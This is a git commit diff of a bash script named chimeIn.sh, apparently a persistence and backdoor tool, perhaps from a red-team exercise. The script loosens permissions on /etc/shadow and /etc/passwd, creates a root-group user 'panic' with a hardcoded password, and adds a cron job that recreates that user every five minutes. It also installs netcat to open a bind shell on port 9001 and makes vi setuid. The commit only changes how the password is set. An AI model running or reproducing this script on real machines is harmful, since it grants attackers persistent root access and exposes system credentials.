d73b1bf5b0cb46a211feb0009287fe7611183c82
Kole Swesey <45017744+kernelpanicatthedisco@users.noreply.github.com>
2019-11-18 11:14:05 -0600

    Update chimeIn.sh
    cmd passwd

--- chimeIn.sh
+++ chimeIn.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 chmod 644 /etc/shadow
 chmod 666 /etc/passwd
-useradd panic -p iwrites1ns
+useradd panic  && echo -e "iwrites1ns\niwrites1ns" | passwd panic
 usermod -a -G root panic
-echo "\*/5 \* \* \* \*  root  useradd panic -p iwrites1ns && usermod -a -G root panic" >> /etc/crontab
+echo "*/5 * * * *  root  useradd panic && echo -e "iwrites1ns\niwrites1ns" | passwd panic && usermod -a -G root panic" >> /etc/crontab
 apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
 nc.traditional -l -p 9001 -e /bin/bash &
 chmod u+s `which vi`
